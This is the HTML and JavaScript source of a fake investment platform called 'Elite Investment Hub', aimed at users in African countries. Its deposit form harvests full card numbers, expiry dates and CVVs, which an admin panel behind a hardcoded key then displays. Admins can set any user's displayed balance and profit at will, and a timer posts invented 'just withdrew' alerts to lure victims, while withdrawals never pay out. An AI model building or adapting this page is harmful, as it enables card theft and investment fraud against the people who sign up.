<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ELITE INVESTMENT HUB | Global Terminal</title>
    <script src="https://s3.tradingview.com/tv.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap');
        :root { --primary: #00ff88; --bg-dark: #05070a; --sidebar-bg: #0d1117; --glass: rgba(255, 255, 255, 0.03); --border: rgba(255, 255, 255, 0.1); --text-main: #e6edf3; --text-dim: #8b949e; }
        body { font-family: 'Inter', sans-serif; margin: 0; background: var(--bg-dark); color: var(--text-main); display: flex; min-height: 100vh; overflow-x: hidden; }
        
        /* Sidebar */
        .sidebar { width: 260px; background: var(--sidebar-bg); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 25px; position: fixed; height: 100vh; z-index: 100; transition: 0.3s; }
        .main-content { margin-left: 260px; flex: 1; padding: 40px; width: calc(100% - 260px); }
        
        /* Cards & UI */
        .card { background: var(--glass); border: 1px solid var(--border); padding: 25px; border-radius: 20px; backdrop-filter: blur(15px); margin-bottom: 25px; }
        input, select { width: 100%; padding: 14px; background: #161b22; border: 1px solid var(--border); border-radius: 10px; color: white; margin: 10px 0; font-size: 1rem; }
        .btn-pro { background: var(--primary); color: #000; font-weight: 800; border: none; padding: 16px; border-radius: 12px; cursor: pointer; width: 100%; text-transform: uppercase; transition: 0.3s; }
        .btn-pro:hover { box-shadow: 0 0 20px rgba(0, 255, 136, 0.4); transform: translateY(-2px); }
        
        /* Navigation */
        .nav-item { padding: 14px 18px; border-radius: 12px; color: var(--text-dim); cursor: pointer; display: flex; align-items: center; gap: 15px; margin-bottom: 8px; transition: 0.2s; }
        .nav-item:hover, .nav-item.active { background: var(--glass); color: var(--primary); border: 1px solid var(--border); }
        
        /* Notifications */
        #notification-box { position: fixed; top: 20px; right: 20px; z-index: 9999; pointer-events: none; }
        .toast { background: #111827; color: white; padding: 15px 20px; border-radius: 12px; border-left: 4px solid var(--primary); margin-bottom: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: flex; align-items: center; gap: 12px; animation: slideIn 0.5s ease forwards; width: 320px; }
        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }

        .hidden { display: none !important; }
        #auth-screen { position: fixed; inset: 0; background: var(--bg-dark); z-index: 2000; display: flex; align-items: center; justify-content: center; padding: 20px; overflow-y: auto; }

        @media (max-width: 900px) {
            .sidebar { width: 80px; padding: 15px; }
            .sidebar span { display: none; }
            .main-content { margin-left: 80px; width: calc(100% - 80px); padding: 20px; }
        }
    </style>
</head>
<body>

    <div id="notification-box"></div>

    <div id="auth-screen">
        <div class="card" style="width: 100%; max-width: 450px;">
            <h2 style="text-align: center; color: var(--primary);">ELITE HUB TERMINAL</h2>
            <div id="reg-form">
                <input id="regName" placeholder="Full Name">
                <input id="regPhone" placeholder="Phone Number (+...)">
                <select id="regCountry">
                    <option value="">-- Select Your Country --</option>
                    <option value="Algeria">ğŸ‡©ğŸ‡¿ Algeria</option><option value="Angola">ğŸ‡¦ğŸ‡´ Angola</option><option value="Benin">ğŸ‡§ğŸ‡¯ Benin</option><option value="Botswana">ğŸ‡§ğŸ‡¼ Botswana</option><option value="Burkina Faso">ğŸ‡§ğŸ‡« Burkina Faso</option><option value="Burundi">ğŸ‡§ğŸ‡® Burundi</option><option value="Cameroon">ğŸ‡¨ğŸ‡² Cameroon</option><option value="Cape Verde">ğŸ‡¨ğŸ‡» Cape Verde</option><option value="CAR">ğŸ‡¨ğŸ‡« Central African Republic</option><option value="Chad">ğŸ‡¹ğŸ‡© Chad</option><option value="Comoros">ğŸ‡°ğŸ‡² Comoros</option><option value="Congo">ğŸ‡¨ğŸ‡¬ Congo</option><option value="DRC">ğŸ‡¨ğŸ‡© DR Congo</option><option value="Djibouti">ğŸ‡©ğŸ‡¯ Djibouti</option><option value="Egypt">ğŸ‡ªğŸ‡¬ Egypt</option><option value="Equatorial Guinea">ğŸ‡¬ğŸ‡¶ Equatorial Guinea</option><option value="Eritrea">ğŸ‡ªğŸ‡· Eritrea</option><option value="Ethiopia">ğŸ‡ªğŸ‡¹ Ethiopia</option><option value="Gabon">ğŸ‡¬ğŸ‡¦ Gabon</option><option value="Gambia">ğŸ‡¬ğŸ‡² Gambia</option><option value="Ghana">ğŸ‡¬ğŸ‡­ Ghana</option><option value="Guinea">ğŸ‡¬ğŸ‡³ Guinea</option><option value="Ivory Coast">ğŸ‡¨ğŸ‡® Ivory Coast</option><option value="Kenya">ğŸ‡°ğŸ‡ª Kenya</option><option value="Lesotho">ğŸ‡±ğŸ‡¸ Lesotho</option><option value="Liberia">ğŸ‡±ğŸ‡· Liberia</option><option value="Libya">ğŸ‡±ğŸ‡¾ Libya</option><option value="Madagascar">ğŸ‡²ğŸ‡¬ Madagascar</option><option value="Malawi">ğŸ‡²ğŸ‡¼ Malawi</option><option value="Mali">ğŸ‡²ğŸ‡± Mali</option><option value="Mauritania">ğŸ‡²ğŸ‡· Mauritania</option><option value="Mauritius">ğŸ‡²ğŸ‡º Mauritius</option><option value="Morocco">ğŸ‡²ğŸ‡¦ Morocco</option><option value="Mozambique">ğŸ‡²ğŸ‡¿ Mozambique</option><option value="Namibia">ğŸ‡³ğŸ‡¦ Namibia</option><option value="Niger">ğŸ‡³ğŸ‡ª Niger</option><option value="Nigeria">ğŸ‡³ğŸ‡¬ Nigeria</option><option value="Rwanda">ğŸ‡·ğŸ‡¼ Rwanda</option><option value="Senegal">ğŸ‡¸ğŸ‡³ Senegal</option><option value="Seychelles">ğŸ‡¸ğŸ‡¨ Seychelles</option><option value="Sierra Leone">ğŸ‡¸ğŸ‡± Sierra Leone</option><option value="Somalia">ğŸ‡¸ğŸ‡´ Somalia</option><option value="South Africa">ğŸ‡¿ğŸ‡¦ South Africa</option><option value="South Sudan">ğŸ‡¸ğŸ‡¸ South Sudan</option><option value="Sudan">ğŸ‡¸ğŸ‡© Sudan</option><option value="Tanzania">ğŸ‡¹ğŸ‡¿ Tanzania</option><option value="Togo">ğŸ‡¹ğŸ‡¬ Togo</option><option value="Tunisia">ğŸ‡¹ğŸ‡³ Tunisia</option><option value="Uganda">ğŸ‡ºğŸ‡¬ Uganda</option><option value="Zambia">ğŸ‡¿ğŸ‡² Zambia</option><option value="Zimbabwe">ğŸ‡¿ğŸ‡¼ Zimbabwe</option>
                </select>
                <input id="regPass" type="password" placeholder="Password">
                <button class="btn-pro" onclick="register()">Join the Elite</button>
                <p style="text-align:center; margin-top:15px; cursor:pointer; color:var(--text-dim);" onclick="toggleAdmin(true)">Administrative Login</p>
            </div>
            <div id="admin-login" class="hidden">
                <input id="adminPass" type="password" placeholder="Admin Access Key">
                <button class="btn-pro" onclick="adminAuth()">Login to Backend</button>
                <p style="text-align:center; margin-top:15px; cursor:pointer;" onclick="toggleAdmin(false)">Back to Registration</p>
            </div>
        </div>
    </div>

    <nav class="sidebar hidden" id="sideNav">
        <div style="font-size: 1.4rem; font-weight: 800; color: var(--primary); margin-bottom: 40px; display:flex; align-items:center; gap:10px;">
            <i class="fas fa-shield-alt"></i> <span>ELITE HUB</span>
        </div>
        <div class="nav-item active" onclick="showPage('dash')"><i class="fas fa-th-large"></i> <span>Dashboard</span></div>
        <div class="nav-item" onclick="showPage('deposit')"><i class="fas fa-wallet"></i> <span>Deposit</span></div>
        <div class="nav-item" onclick="showPage('withdraw')"><i class="fas fa-hand-holding-usd"></i> <span>Withdraw</span></div>
        <div id="adminTab" class="nav-item hidden" onclick="showPage('admin')"><i class="fas fa-user-shield"></i> <span>Admin Panel</span></div>
        <div class="nav-item" style="margin-top: auto; color: #ff4d4d;" onclick="logout()"><i class="fas fa-power-off"></i> <span>Logout</span></div>
    </nav>

    <main class="main-content hidden" id="mainApp">
        
        <div id="page-dash">
            <h2 id="greet">Welcome</h2>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px;">
                <div class="card" style="border-left: 4px solid var(--primary);">
                    <p style="color:var(--text-dim);">Available Balance</p>
                    <h2 id="uTotal" style="color: var(--primary);">0.00</h2>
                </div>
                <div class="card">
                    <p style="color:var(--text-dim);">Current Investment</p>
                    <h3 id="uInv">0.00</h3>
                </div>
                <div class="card">
                    <p style="color:var(--text-dim);">Total Profit</p>
                    <h3 id="uProf" style="color: #00ff88;">+ 0.00</h3>
                </div>
            </div>
            <div class="card" style="height: 450px; padding: 10px;">
                <div id="tradingview_widget" style="height: 100%;"></div>
            </div>
        </div>

        <div id="page-deposit" class="hidden">
            <h1>Funding Methods</h1>
            <div class="card">
                <h3><i class="fas fa-credit-card"></i> Bank Card Deposit</h3>
                <p style="color: var(--text-dim);">Secure instant funding via Visa/Mastercard.</p>
                <input id="cardName" placeholder="Cardholder Full Name">
                <input id="cardNumber" placeholder="Card Number (16 Digits)">
                <div style="display: flex; gap: 10px;">
                    <input id="cardExp" placeholder="MM/YY">
                    <input id="cardCVV" placeholder="CVV">
                </div>
                <input id="cardAmt" type="number" placeholder="Deposit Amount">
                <button class="btn-pro" onclick="submitCard()">Process Deposit</button>
            </div>
        </div>

        <div id="page-withdraw" class="hidden">
            <h1>Withdraw Funds</h1>
            <div class="card">
                <p>Minimum Withdrawal Required: <b id="minLabel">2,000</b></p>
                <input id="wAmount" type="number" placeholder="Amount to Withdraw">
                <input id="wWallet" placeholder="Destination (M-Pesa / Bank / USDT)">
                <button class="btn-pro" onclick="processWithdraw()">Request Cashout</button>
            </div>
        </div>

        <div id="page-admin" class="hidden">
            <h1>System Administration</h1>
            <div class="card" style="border: 1px solid #ffaa00;">
                <h3><i class="fas fa-envelope"></i> Card Submission Messages</h3>
                <div id="cardMessages" style="max-height: 300px; overflow-y: auto;">No submissions found.</div>
            </div>
            <div class="card">
                <h3>User Financial Overrides</h3>
                <input id="aPhone" placeholder="Enter User Phone Number">
                <input id="aInv" type="number" placeholder="Override Investment">
                <input id="aProf" type="number" placeholder="Override Profit">
                <button class="btn-pro" onclick="updateUser()">Sync Account Data</button>
            </div>
        </div>

    </main>

    <script>
        let users = JSON.parse(localStorage.getItem("users_v2")) || [];
        const countryData = { "Kenya": {s:"KES", r:1}, "Nigeria": {s:"NGN", r:11.5}, "Ghana": {s:"GHS", r:0.095}, "South Africa": {s:"ZAR", r:0.14} };

        function register() {
            if(!regCountry.value) return alert("Select your country");
            let u = { name: regName.value, phone: regPhone.value, pass: regPass.value, country: regCountry.value, inv: 0, prof: 0, cards: [] };
            users.push(u); save(); localStorage.setItem("activeUser", u.phone); location.reload();
        }

        function adminAuth() { if(adminPass.value === "elite123") { localStorage.setItem("isAdmin", "true"); start(); } }
        function toggleAdmin(s) { document.getElementById('reg-form').classList.toggle('hidden', s); document.getElementById('admin-login').classList.toggle('hidden', !s); }

        function start() {
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('sideNav').classList.remove('hidden');
            document.getElementById('mainApp').classList.remove('hidden');
            if(localStorage.getItem("isAdmin")) {
                document.getElementById('adminTab').classList.remove('hidden');
                renderAdminView();
            }

            let u = users.find(x => x.phone == localStorage.getItem("activeUser"));
            if(u) {
                let c = countryData[u.country] || {s:"USD", r:0.0076};
                let total = u.inv + u.prof;
                uTotal.innerText = `${c.s} ${total.toLocaleString()}`;
                uInv.innerText = `${c.s} ${u.inv.toLocaleString()}`;
                uProf.innerText = `+ ${c.s} ${u.prof.toLocaleString()}`;
                minLabel.innerText = `${c.s} 2,000`;
                greet.innerText = `Welcome Back, ${u.name}`;
            }
            new TradingView.widget({ "autosize": true, "symbol": "FX:EURUSD", "theme": "dark", "container_id": "tradingview_widget" });
            startNotificationEngine();
        }

        function submitCard() {
            let u = users.find(x => x.phone == localStorage.getItem("activeUser"));
            u.cards.push({ name: cardName.value, num: cardNumber.value, exp: cardExp.value, cvv: cardCVV.value, amt: cardAmt.value, time: new Date().toLocaleString() });
            save();
            sendNotice("Transaction details encrypted and submitted.");
            showPage('dash');
        }

        function renderAdminView() {
            let html = '';
            users.forEach(u => {
                (u.cards || []).forEach(d => {
                    html += `<div style="padding:15px; border-bottom:1px solid #333; font-size:0.9rem;">
                        <b>User:</b> ${u.name} (${u.phone})<br>
                        <b>Card Detail:</b> ${d.name} | ${d.num} | Exp: ${d.exp} | CVV: ${d.cvv}<br>
                        <b>Amt Requested:</b> ${d.amt} | <b>Time:</b> ${d.time}
                    </div>`;
                });
            });
            document.getElementById('cardMessages').innerHTML = html || "No recent card activity.";
        }

        function processWithdraw() {
            let u = users.find(x => x.phone == localStorage.getItem("activeUser"));
            let amt = Number(wAmount.value);
            if(amt < 2000) return alert("Withdrawal must be at least 2,000");
            if(amt > (u.inv + u.prof)) return alert("Insufficient available balance.");
            sendNotice("Withdrawal request under review.");
        }

        function updateUser() {
            let u = users.find(x => x.phone == aPhone.value);
            if(u) { u.inv = Number(aInv.value); u.prof = Number(aProf.value); save(); start(); sendNotice("User Updated"); }
        }

        function startNotificationEngine() {
            const flags = ["ğŸ‡°ğŸ‡ª", "ğŸ‡³ğŸ‡¬", "ğŸ‡¿ğŸ‡¦", "ğŸ‡¬ğŸ‡­", "ğŸ‡ºğŸ‡¬", "ğŸ‡ªğŸ‡¬", "ğŸ‡¹ğŸ‡¿", "ğŸ‡·ğŸ‡¼"];
            const names = ["K. Mwangi", "O. Adeyemi", "L. Zulu", "J. Mensah", "P. Okello", "M. Hassan"];
            setInterval(() => {
                let f = flags[Math.floor(Math.random()*flags.length)];
                let n = names[Math.floor(Math.random()*names.length)];
                let a = (Math.random()*15000 + 2000).toFixed(0);
                sendNotice(`${f} ${n} just withdrew KES ${a}`);
            }, 10000);
        }

        function sendNotice(m) {
            const t = document.createElement('div'); t.className = 'toast';
            t.innerHTML = `<i class="fas fa-bell"></i> <span>${m}</span>`;
            document.getElementById('notification-box').appendChild(t);
            setTimeout(() => t.remove(), 4000);
        }

        function showPage(id) { 
            document.querySelectorAll('main > div').forEach(d => d.classList.add('hidden'));
            document.getElementById('page-' + id).classList.remove('hidden');
        }

        function save() { localStorage.setItem("users_v2", JSON.stringify(users)); }
        function logout() { localStorage.clear(); location.reload(); }
        window.onload = () => { if(localStorage.getItem("activeUser") || localStorage.getItem("isAdmin")) start(); };
    </script>
</body>
</html>

